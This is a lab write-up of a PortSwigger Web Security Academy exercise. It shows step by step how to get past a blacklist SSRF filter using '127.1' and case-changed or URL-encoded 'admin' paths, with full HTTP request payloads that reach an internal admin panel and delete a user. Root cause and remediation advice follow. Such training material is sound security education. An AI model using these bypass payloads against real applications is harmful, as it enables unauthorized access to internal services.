# PortSwigger Lab: SSRF with blacklist-based input filter

# TAGS: SSRF, Server-Side Request Forgery, Filter Bypass, Burp Suite

Category: SSRF
Date: November 11, 2026
Day: Wednesday
Link: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-blacklist
Published: Ready
Status: Done

---

## Intro

This is the third lab in the SSRF series. Now the application tries to protect the stock check with a blacklist. It blocks the obvious localhost addresses and even the word "admin". The lesson here is that blacklists are easy to beat, because there is always more than one way to write the same IP or the same path.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the stock check URL is protected by a blacklist, and the goal is to bypass it to reach the admin interface and delete the user `carlos`.

I opened a product and captured the stock request:

```http
POST /product/stock HTTP/2
Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
Cookie: session=rsiqAnMFUFtIEr6I50ChhCaepLjp6iQU
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

My first tries were rejected. Pointing it at `http://127.0.0.1/` returned:

```text
External stock check blocked for security reasons
```

So there is a filter, and I needed to find out exactly what it blocks.

---

## Exploitation:

#### Step 1: Bypass the IP blacklist

The filter rejected `127.0.0.1`, so I tried an alternative way of writing the same address. `127.1` is interpreted by many parsers as `127.0.0.1`:

```http
POST /product/stock HTTP/2
Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
Cookie: session=rsiqAnMFUFtIEr6I50ChhCaepLjp6iQU
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/
```

This time the request succeeded. The IP filter only checks for the exact strings it knows.

#### Step 2: Bypass the path blacklist

Next I tried `http://127.1/admin`, but it was blocked again. The filter also looks for the string "admin". I just changed the case:

```http
POST /product/stock HTTP/2
Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
Cookie: session=rsiqAnMFUFtIEr6I50ChhCaepLjp6iQU
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/Admin
```

The response was the admin panel, showing the links to delete users:

```text
/admin/delete?username=wiener
/admin/delete?username=carlos
```

URL encoding works too. `http://127.1/adm%69n` and `http://127.1/%61dmin` both reached the same page.

#### Step 3: Delete carlos

I changed the URL to the delete endpoint, keeping the same case trick:

```http
POST /product/stock HTTP/2
Host: 0a02001303f19c3380cdcb5b00430028.web-security-academy.net
Cookie: session=rsiqAnMFUFtIEr6I50ChhCaepLjp6iQU
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/Admin/delete?username=carlos
```

The server deleted `carlos` and the lab was solved.

---

## Root Cause

The application protects the stock URL with a blacklist, but blacklists only catch the exact strings they are programmed to block. The filter checks for `127.0.0.1` and `localhost`, but not `127.1`, and it checks for "admin" but not "Admin" or URL-encoded forms. Because the filter is case-sensitive and does not normalize the input before checking, each blocked string has many equivalent forms that slip through.

---

## Impact

A blacklist is an ineffective defense against SSRF. An attacker can reach internal endpoints using alternative IP notations and encoded paths. In this lab that was enough to delete a user. In a real application the same bypass leads to internal service access, data theft or further compromise.

---

## Remediation

To prevent this issue, applications should:

- Use an allow-list of permitted destinations instead of a blacklist.
- Normalize and resolve the host before validating it, so equivalent forms are treated the same.
- Block entire IP ranges and cloud metadata endpoints at the network level.
- Authenticate and authorize every internal endpoint, and never rely on the hostname or path being "hidden".

---

## Key Takeaways

1. Blacklists fail because there are always equivalent ways to write the same target.
2. `127.1` is a quick bypass for `127.0.0.1`.
3. Case and URL encoding bypass string filters like "admin".
4. Always normalize the URL before applying any check.

---

## References

- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [PortSwigger — SSRF with blacklist-based input filter (lab)](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-blacklist)
- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
